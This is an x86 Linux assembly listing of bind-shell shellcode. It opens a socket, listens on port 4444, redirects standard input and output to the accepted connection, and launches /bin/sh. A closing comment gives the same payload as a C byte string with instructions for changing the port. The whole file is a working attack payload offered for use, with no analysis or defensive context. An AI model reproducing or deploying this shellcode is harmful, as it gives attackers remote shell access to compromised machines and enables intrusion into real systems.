
.text
 
.globl _start
_start:
 
	xor             %eax, %eax
	xor             %ebx, %ebx
    xor             %ecx, %ecx
    xor             %edx, %edx
 
    # socket
    movb            $102, %al
    inc             %ebx
    pushl           %ecx
    pushl           %ebx
    inc             %ebx
    pushl           %ebx
    dec             %ebx
    movl            %esp, %ecx
    int $0x80
    movl            %eax, %esi
 
    # bind
    movb            $102, %al
    inc             %ebx
    # sockaddr_in
    pushl           %edx
    pushw           $0x5c11
    pushw           $0x02
    movl            %esp, %edi
    push            $16
    pushl           %edi
    pushl           %esi
    movl            %esp, %ecx
    int $0x80
               
    # listen
    movb            $102, %al
    inc             %ebx
    inc             %ebx
    push            $0x4
    pushl           %esi
    movl            %esp, %ecx
    int $0x80
 
    # accept
    movb            $102, %al
    inc             %ebx
    pushl           %edx
    pushl           %edx
    pushl           %esi
    movl            %esp, %ecx
    int $0x80
 
    # dup2();
    movl            %eax, %ebx
    xor             %ecx, %ecx
    inc             %edx
    inc             %edx
    dup2:
    	movb            $63, %al
        int $0x80
        inc             %ecx
        cmp             %edx, %ecx
        jle dup2
 
    # execve();
    dec             %edx
    dec             %edx
    pushl           %edx
    pushl           $0x68732f6e
    pushl           $0x69622f2f
    movb            $11, %al
    movl            %esp, %ebx
    xor             %ecx, %ecx
    int $0x80

/*
 * static const char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31"
 *                                 "\xd2\xb0\x66\x43\x51\x53\x43"
 *                                 "\x53\x4b\x89\xe1\xcd\x80\x89"
 *                                 "\xc6\xb0\x66\x43\x52\x66\x68"
 *                                 "\x00\x00\x66\x6a\x02\x89\xe7"
 *                                 "\x6a\x10\x57\x56\x89\xe1\xcd"
 *                                 "\x80\xb0\x66\x43\x43\x6a\x04"
 *                                 "\x56\x89\xe1\xcd\x80\xb0\x66"
 *                                 "\x43\x52\x52\x56\x89\xe1\xcd"
 *                                 "\x80\x89\xc3\x31\xc9\x42\x42"
 *                                 "\xb0\x3f\xcd\x80\x41\x39\xd1"
 *                                 "\x7e\xf7\x4a\x4a\x52\x68\x6e"
 *                                 "\x2f\x73\x68\x68\x2f\x2f\x62"
 *                                 "\x69\xb0\x0b\x89\xe3\x31\xc9"
 *                                 "\xcd\x80";
 * Replace the zeroes in the shellcode to provide a port to listen
 * on. Compiling will listen on port '4444' as default.
 */